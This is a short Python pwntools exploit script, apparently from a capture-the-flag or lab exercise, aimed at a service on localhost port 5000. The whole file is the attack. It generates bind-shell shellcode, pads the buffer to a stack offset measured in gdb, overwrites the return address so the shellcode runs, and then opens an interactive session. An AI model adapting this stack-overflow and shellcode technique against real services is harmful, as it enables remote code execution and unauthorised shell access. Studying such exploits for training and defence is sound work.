from pwn import *

context.arch = 'amd64'

base_addr = 0x7fffffffea90                # given by program (inside docker container)
diff = 0x7fffffffdd38 - 0x7fffffffdb20    # determined from gdb

# Set up the connection to the target system
target = remote('127.0.0.1', 5000)

# Generate the stage 1 shellcode to connect to the target
stage1_shellcode = shellcraft.amd64.linux.bindsh(4567, '127.0.0.1')

# Assemble and send the stage 1 shellcode to the target system
assembled_stage1_shellcode = asm(stage1_shellcode)

padding = b'\0' * (diff - 1 - len(assembled_stage1_shellcode))
raddr = p64(base_addr + 1)

payload = b'\0' + assembled_stage1_shellcode + padding + raddr
target.send(payload)

target.interactive()
